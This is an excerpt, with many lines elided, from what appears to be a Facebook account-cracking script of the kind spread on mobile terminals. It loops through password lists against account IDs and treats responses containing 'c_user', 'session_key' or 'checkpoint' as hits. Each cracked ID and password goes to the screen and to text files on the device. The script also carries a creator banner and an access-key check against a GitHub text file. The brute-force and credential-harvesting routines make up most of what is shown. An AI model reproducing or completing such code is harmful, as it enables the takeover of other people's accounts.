	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [Zunii-OK] %s | %s'%(ids,pas))
				open('/sdcard/Zunii-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Zunii-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/Zunii-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Zunii-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/Zunii-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [Zunii-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  print("""\033[1;32m
         ...
         \033[1;32m  Yb  dP 888888 888888 
         \033[1;32m  YbdP  88__   88__   
         \033[1;32m  dPYb  88""   88""   
         \033[1;32m  dP  Yb 888888 888888 
\033[1;92m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mZK 🖕🖕X\033[1;32m
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/Zunera-405/Test-ZK/blob/main/T.txt").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Zunera-405/Test-ZK/blob/main/T.txt').text
